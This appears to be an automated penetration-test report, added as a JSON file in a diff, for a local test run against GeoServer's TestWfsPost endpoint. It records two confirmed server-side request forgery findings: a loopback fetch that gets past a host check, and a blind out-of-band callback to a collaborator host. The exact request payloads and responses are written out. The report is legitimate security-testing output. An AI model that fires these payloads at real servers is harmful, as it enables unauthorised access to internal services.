@@ -1,0 +1,87 @@
+{
+  "id": "7e1980d0-3e20-465e-a23e-9b1934dcfa60",
+  "engagement_name": "P6 OOB isolation",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-19T07:20:01.878346Z",
+  "test_end": "2026-07-19T07:20:01.878346Z",
+  "generated_at": "2026-07-19T07:20:01.878970Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 2 findings identified.",
+    "risk_rating": "High",
+    "critical_count": 0,
+    "high_count": 2,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "da14be48-ea1b-48fb-881a-3e31aa674630",
+      "title": "Server-Side Request Forgery (SSRF) \u2014 reflected_internal",
+      "description": "Technique: WSTG-INPV-19 (SSRF). Parameter: url.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:8080/geoserver/TestWfsPost",
+      "evidence": [
+        "Request: SSRF reflected_internal http://localhost:8080/geoserver/TestWfsPost \u2014 url=http://127.0.0.1:8080/geoserver/",
+        "Response: loopback fetch reflected in-scope internal content ('GeoServer: Redirecting') via http://127.0.0.1:8080/geoserver/ (status 200)",
+        "phases_completed=6 verified=True strength=verified",
+        "exploitation_type=reflected_internal",
+        "capability=fetch_confirmed=True,content_reflected=True,schemes=['http']",
+        "candidate_param=url",
+        "internal_target=http://127.0.0.1:8080/geoserver/",
+        "indicator_type=internal_service",
+        "indicator_observed=loopback fetch reflected in-scope internal content ('GeoServer: Redirecting') via http://127.0.0.1:8080/geoserver/ (status 200)",
+        "confirmation=P3 target=http://127.0.0.1:8080/geoserver/ status=200",
+        "internal_content_marker='GeoServer: Redirecting' (content we never sent; control_reflected_it=False)",
+        "confirming_excerpt: \u2026type=\"text/javascript\"> // javascript based redirect courtesy of ahocevar window.location.replace(\"web/\"); </script> <title>GeoServer: Redirecting</title> </head> <body> <p><b>Redirecting to the actual home page.</b></p> <p>If you're stuck here, it means you don't hav\u2026",
+        "control [same internal-target probe WITHOUT the Host-alignment carrier (server rejects the cross-host fetch \u2014 marker absent)] status=200",
+        "control_excerpt: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <servlet-exception> java.lang.IllegalStateException: Invalid url requested, the demo requests should be hitting: http://localhost:8080/geoserver</servlet-exception>"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-19T07:19:41.578738Z",
+      "validated_at": null
+    },
+    {
+      "id": "c8db4f96-e3d4-4dfb-8cf5-da9b2b878641",
+      "title": "Server-Side Request Forgery (SSRF) \u2014 blind_oob_confirmed",
+      "description": "Technique: WSTG-INPV-19 (SSRF). Parameter: url.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:8080/geoserver/TestWfsPost",
+      "evidence": [
+        "Request: SSRF blind_oob_confirmed http://localhost:8080/geoserver/TestWfsPost \u2014 url=http://host.docker.internal:18080/vkp2qthmfi65kpkl6mbwwe56wa",
+        "Response: out-of-band callback bearing the probe nonce received (http from 127.0.0.1)",
+        "phases_completed=6 verified=True strength=verified-oob",
+        "exploitation_type=blind_oob_confirmed",
+        "capability=fetch_confirmed=True,content_reflected=False,schemes=[]",
+        "candidate_param=url",
+        "internal_target=http://host.docker.internal:18080/vkp2qthmfi65kpkl6mbwwe56wa",
+        "indicator_type=oob_callback",
+        "indicator_observed=out-of-band callback bearing the probe nonce received (http from 127.0.0.1)",
+        "confirmation=P6 target=http://host.docker.internal:18080/vkp2qthmfi65kpkl6mbwwe56wa status=None",
+        "outbound_probe: POST http://localhost:8080/geoserver/TestWfsPost \u2014 url=http://host.docker.internal:18080/vkp2qthmfi65kpkl6mbwwe56wa",
+        "callback_nonce='vkp2qthmfi65kpkl6mbwwe56wa' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18080 path=/vkp2qthmfi65kpkl6mbwwe56wa received_at=1784445581.618",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-19T07:20:01.874444Z",
+      "validated_at": null
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
